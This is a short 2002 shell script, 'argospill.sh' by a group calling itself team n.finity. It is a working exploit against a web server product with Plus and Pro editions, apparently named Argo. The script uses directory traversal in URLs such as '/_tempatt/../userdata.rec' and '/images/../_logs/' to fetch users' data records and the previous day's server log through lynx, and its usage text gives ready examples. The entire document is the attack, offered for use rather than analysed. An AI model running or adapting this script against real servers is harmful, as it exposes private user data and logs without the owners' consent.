#!/bin/sh
#
# released on 06/07/2002 by team n.finity <nfinity@gmx.net>
# find us at http://nfinity.yoll.net/
#
# argospill.sh

HOST=$1
USER=$2
DOMAIN=$3

startpro()
{
    echo -e "\nSpilling user $USER @ $DOMAIN, host $HOST (Pro)\n"
    URL=/_users/$DOMAIN/$USER/_tempatt/../userdata.rec
    /usr/bin/lynx -dump http://$HOST$URL
}

startplus()
{
    echo -e "\nSpilling user $USER, host $HOST (Plus)\n"
    URL=/$USER/_tempatt/../userdata.rec
    /usr/bin/lynx -dump http://$HOST$URL
}

startboth()
{
    echo -e "\nSpilling host $HOST (Plus / Pro)\n"
    URL=/images/../_logs/`date -d '-1 day' +%Y-%m-%d`.txt
    /usr/bin/lynx -dump http://$HOST$URL
}

usage()
{
    echo -e "\nUsage:\n"
    echo "Both - $0 <host>"
    echo "Pro  - $0 <host> <user> <domain>"
    echo "Plus - $0 <host> <user>"
    echo -e "\nExample:\n"
    echo "Both, images dir - $0 www.test.com"
    echo "Plus, no dom req - $0 www.test.com me"
    echo "Pro, default dom - $0 www.test.com me _nodomain"
    echo "Pro, virtual dom - $0 www.test.com me test.com"
}

echo "Argospill 1.0 by Team N.finity"

if [ -n "$HOST" ]; then
    if [ -n "$USER" ]; then
        if [ -n "$DOMAIN" ]; then
            startpro
        else
            startplus
        fi
    else
        startboth
    fi
else
    usage
fi
